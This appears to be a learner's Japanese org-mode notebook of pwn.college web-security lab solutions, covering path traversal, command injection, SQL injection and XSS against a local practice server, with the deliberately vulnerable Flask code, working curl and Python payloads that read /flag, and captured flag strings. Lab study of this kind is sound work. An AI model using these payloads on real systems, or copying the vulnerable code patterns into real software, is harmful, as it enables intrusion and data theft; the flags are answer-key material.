#+OPTIONS: d:nil

* Content Injection [1/6]
** TODO Path Traversal 1
#+NAME: server
#+begin_src python
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import flask
import os

app = flask.Flask(__name__)


@app.route("/package", methods=["GET"])
@app.route("/package/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
#+end_src
~--path-as-is~ を付加しないとフラグは得られなかった。curl のバージョンは\(8.17.0\)だった。

#+begin_src shell :eval no
curl --path-as-is http://challenge.localhost/package/../../flag
#+end_src
** DONE Path Traversal 2
CLOSED: [2026-06-09 火 23:32]
:LOGBOOK:
- CLOSING NOTE [2026-06-09 火 23:32] \\
  fortunes を見落していてなかなか解けなかった...

  #+begin_comment
  pwn.college{kKM0dpmyBsNbIWN2_DdICoYE9yq.dJjN1YDL2AjNyMzW}
  #+end_comment

  #+begin_example
  DEBUG: requested_path='/challenge/files/fortunes/../../../flag'
  127.0.0.1 - - [09/Jun/2026 14:31:01] "GET /serve/fortunes/..%2F..%2F..%2Fflag HTTP/1.1" 200 -
  #+end_example
- Note taken on [2026-06-09 火 22:18] \\
  おしい？

  #+begin_example
  127.0.0.1 - - [09/Jun/2026 13:09:55] "GET /serve/..%2f..%2fflag HTTP/1.1" 404 -
  #+end_example
:END:
#+NAME: server
#+begin_src python
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import flask
import os

app = flask.Flask(__name__)


@app.route("/serve", methods=["GET"])
@app.route("/serve/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
#+end_src

#+begin_src shell
curl "challenge.localhost/serve/fortunes/..%2F..%2F..%2Fflag"
#+end_src
*** 参考
1. [[https://blog.hamayanhamayan.com/entry/2021/12/08/220449][CTFのWebセキュリティにおけるPath Traversal, LFI/RFI (File Upload, ZipSlip) - はまやんはまやんはまやん]]
** TODO CMDi 1
:LOGBOOK:
- Note taken on [2026-06-10 水 09:16] \\
  #+begin_comment
  pwn.college{YYdXJaz4HORdyee8PwfGkKYvTQ-.dVjN1YDL2AjNyMzW}
  #+end_comment
:END:
~;~ を先頭に入れると直前のコマンドを終了させて、任意のコードを実行できる。

#+NAME: server
#+begin_src python
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/resource", methods=["GET"])
def challenge():
    arg = flask.request.args.get("dir", "/challenge")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/resource"><input type=text name=dir><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
#+end_src

スペースを他の文字に置き換える必要がある。

#+begin_src shell
curl "http://challenge.localhost:80/resource?dir=;cat%20/flag"
#+end_src

#+begin_src shell
curl "http://challenge.localhost:80/resource?dir=;cat</flag"
#+end_src
** TODO CMDi 2

#+begin_src shell
curl "http://challenge.localhost/event?top-path=%0acat</flag"
#+end_src
** CMDi 3
~ls -l~ には、 ~''~ があるので、なにかしらの引数を与えないとエラーになる。
そこで、現在のディレクトリを表す ~.~ などを指定して、いったん ~'~ で閉じる。
今回は ~;~ の使用は制限されていないので、その後に続けて、フラグを覗くコマンドを与える。
なお、最後の ~'~ を閉じる必要があるので、忘れずに行う。

#+begin_src shell
curl "http://challenge.localhost/test?filedir=.';cat</flag'"
#+end_src
** CMDi 4
最後の ~;~ を忘れずに。

#+begin_src shell
curl "http://challenge.localhost/event?time-zon=;cat</flag;"
#+end_src
** CMDi 5
これでいいのか？

#+begin_src shell
curl "http://challenge.localhost/activity?file-loc=empty.txt;cat%20/flag%20>%20flag";cat flag
#+end_src

** CMDi 6
だいたいの文字が弾かれるようになっているので、改行で区切る。

#+begin_src shell
curl "http://challenge.localhost/goal?subdirectory=%0acat%20/flag"
#+end_src
** TODO Authentication Bypass 1
** TODO Authentication Bypass 2
** SQLi 1
とりあえず python でスクリプトを組んだ。

#+begin_src python :eval no
#!/usr/bin/env python

import requests

url = "http://challenge.localhost/authenticate"

session = requests.Session()

payload = {
    "identity": "admin",
    "pin": "1 OR 1=1"
}

try:
    response = session.post(url, data=payload)
    print(response.text)
except:
    print("Error")
#+end_src

#+begin_src shell
python exploit.py | grep 'flag'
#+end_src

（実行はリモートサーバー上で）

#+begin_comment
9 day streak...
#+end_comment
** SQLi 2
サーバーの以下の部分で ~username~ に ~admin~ を指定し、加えて ~password = '' OR '1=1'~ として、条件を真にする。
よって、 ~pword~ で指定する文字列は ~'OR '1=1~ となる。

#+begin_src python
query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'
#+end_src

#+begin_src python :eval no
#!/usr/bin/env python

import requests

url = "http://challenge.localhost/gateway"

session = requests.Session()

payload = {
    "userid": "admin",
    "pword": "'OR '1=1"
}

try:
    response = session.post(url, data=payload)
    print(response.text)
except:
    print("Error")
#+end_src
* Cross Site Scripting [1/7]
** DONE XSS 1
CLOSED: [2026-06-17 水 09:28]
:LOGBOOK:
- Note taken on [2026-06-17 水 10:06] \\
  #+begin_comment
  反射型と蓄積型

  なにがいけなかったのか
  #+end_comment
- CLOSING NOTE [2026-06-17 水 09:28] \\
  #+begin_comment
  ~pwn.college{k-6PQZhZ-9UkXJgtutEhoTH5Zt5.dVzN1YDL2AjNyMzW}~
  #+end_comment
:END:
#+begin_comment
あなたには、被害者ユーザーがウェブサーバーを訪れるのを模擬したプログラムがあります。
#+end_comment

この問題では、 ~/challenge/victim~ で XSS が行われたかの判定とフラグの出力がされる。

はじめに、 ~/challenge/server~ を起動させてから、 ~/challenge/victim~ を実行してみると以下のような出力が得られる。

#+begin_example
Visiting http://challenge.localhost:80/...
You did not inject an <input> textbox...
#+end_example

ここで、 ~/challenge/victim~ の内容を確認する。

ページ要素から正規表現で ~<input>~ の個数を取得し、個数が 3 以上ならフラグが出力されるようになっている。

#+begin_src python :eval no
num_inputs = len(re.findall(r"<input[^<]*>", requests.get(challenge_url, timeout=1).text))
if num_inputs <= 2:
    print("You did not inject an <input> textbox...")
else:
    print("You got it! Here is your flag:")
    print(flag)
#+end_src

よって、 ~/challenge/server~ より、 ~<input>~ はすでに 2 つあるので、以下のようなリクエストを行ってインジェクトする。

#+begin_src shell
curl -X POST -d "content=<input>" http://challenge.localhost
#+end_src

このあとに ~/challenge/victim~ を実行するとフラグが出力される。

なお、このような方法だと以下のような出力がなされて、インジェクションされているか確認ができない。

#+begin_example
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
#+end_example

そこで、以下のようなスクリプトを組むと、内容を確認できる。

#+NAME: exploit.py
#+begin_src python :eval no
# exploit.py
#!/usr/bin/env python

import requests

url = "http://challenge.localhost"

session = requests.Session()

payload = {
    "content": "<input>",
}

try:
    response = session.post(url, data=payload)
    print(response.text)
except:
    print("Error")
#+end_src

#+begin_src shell
python3 exploit.py
#+end_src

#+begin_example
<html><body>
Welcome to pwnpost, the anonymous posting service. Post away!
<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>
<hr>First Post!
<hr><input>
</body></html>
#+end_example
** DONE XSS 2
CLOSED: [2026-06-18 木 13:53]
:LOGBOOK:
- CLOSING NOTE [2026-06-18 木 13:53] \\
  #+begin_comment
  pwn.college{wb9eK5A0nmpYrr1tgegOpM8jeYn.ddzN1YDL2AjNyMzW}
  #+end_comment
:END:
** TODO XSS 3
** TODO XSS 4
** TODO XSS 5
** TODO XSS 6
** TODO XSS 7
